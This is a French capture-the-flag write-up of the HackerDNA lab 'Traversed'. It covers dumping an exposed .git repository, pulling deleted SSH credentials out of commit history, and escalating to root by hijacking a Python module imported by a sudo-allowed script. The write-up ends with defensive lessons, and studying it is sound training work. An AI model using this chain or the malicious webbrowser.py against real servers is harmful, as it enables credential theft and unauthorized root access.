# Compte rendu : Traversed

Plateforme : HackerDNA (https://hackerdna.com/labs/traversed)
Auteur : SRH
Difficulté : Moyenne
Tags : Git Exposure, Git Dumper, Credentials Leak, SSH, Python Module Hijacking, Privilege Escalation
XP : +400 XP

## Scénario
Un serveur web expose accidentellement son dépôt Git. L'objectif est de reconstruire l'historique du dépôt pour retrouver des identifiants SSH supprimés, de se connecter au serveur, puis d'escalader vers root en exploitant un détournement de module Python dans un script exécuté en sudo.

Prérequis : bases de Git, ligne de commande Linux, compréhension des mécanismes d'import Python, familiarité avec SSH.

## Chaîne d'Attaque
[Reconnaissance] → [Découverte du dépôt Git] → [Dump du dépôt] → [Fuite d'identifiants dans l'historique] → [Connexion SSH] → [Flag user] → [Énumération sudo] → [Module hijacking Python] → [Flag root] → 🚩

## Étape 1 — Reconnaissance
Le scan Nmap révèle les ports 22 (SSH) et 80 (HTTP). La page d'accueil est statique et ne révèle rien d'intéressant. Un scan de répertoires révèle la présence d'un répertoire .git exposé, ce qui est une mauvaise configuration classique.

curl -s http://<IP>/.git/HEAD
# → ref: refs/heads/master

## Étape 2 — Dump du dépôt Git
On utilise git-dumper pour reconstruire le dépôt localement. Si l'outil n'est pas installé, on peut l'installer via pipx.

pipx install git-dumper
git-dumper http://<IP>/.git/ ./repo
cd repo

## Étape 3 — Fuite d'identifiants dans l'historique Git
L'historique des commits révèle un fichier credentials.txt ajouté puis supprimé. Le commit eba1551 contient les identifiants en clair.

git log --all --oneline
# → eba1551 Added credentials for the server maintanance

git show eba1551:credentials.txt
# → hackerdna:<PASSWORD_SSH>

Le fichier a ensuite été "redacted" (94ad98f) puis supprimé (da5d3b7), mais l'historique Git conserve la version originale.

## Étape 4 — Connexion SSH et flag utilisateur
On se connecte en SSH avec les identifiants trouvés et on lit le flag utilisateur.

ssh hackerdna@<IP>
cat /home/flag-user.txt

Flag User : <USER_FLAG>

## Étape 5 — Énumération sudo
On vérifie les droits sudo de l'utilisateur hackerdna. Un script Python est autorisé en root sans mot de passe.

sudo -l
# → (root) NOPASSWD: /usr/bin/python3 /home/hackerdna/test.py

Le script test.py importe le module webbrowser :

import webbrowser
webbrowser.open("https://google.com")

## Étape 6 — Détournement de module Python
Python cherche d'abord les modules dans le répertoire du script avant les chemins système. On crée un faux module webbrowser.py dans /home/hackerdna/ qui exécute une commande malveillante lors de l'import.

cat > /home/hackerdna/webbrowser.py << 'EOF'
import os
def open(url):
    os.system("cat /root/flag-root.txt > /home/hackerdna/root_flag.txt")
EOF

On exécute le script autorisé en sudo :

sudo /usr/bin/python3 /home/hackerdna/test.py
cat /home/hackerdna/root_flag.txt

Flag Root : <ROOT_FLAG>

## Conclusion
Ce lab illustre deux vulnérabilités classiques : un dépôt Git exposé qui permet de retrouver des secrets supprimés dans l'historique, et un détournement de module Python (module hijacking) qui exploite la priorité des imports locaux dans un script exécuté en root. L'enchaînement des deux mène à une compromission complète du système.

## Leçons Apprises
1. Ne jamais exposer le répertoire .git sur un serveur web en production.
2. Supprimer un fichier avec git rm ne supprime pas son historique : utiliser git filter-repo pour réécrire l'historique et changer les identifiants compromis.
3. Ne jamais exécuter de scripts Python en root depuis un répertoire writable par l'utilisateur.
4. Toujours utiliser des chemins absolus dans les imports sensibles ou vérifier les permissions des répertoires de travail.
5. Auditer les règles sudo : autoriser python3 <script> équivaut à donner root à l'utilisateur.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
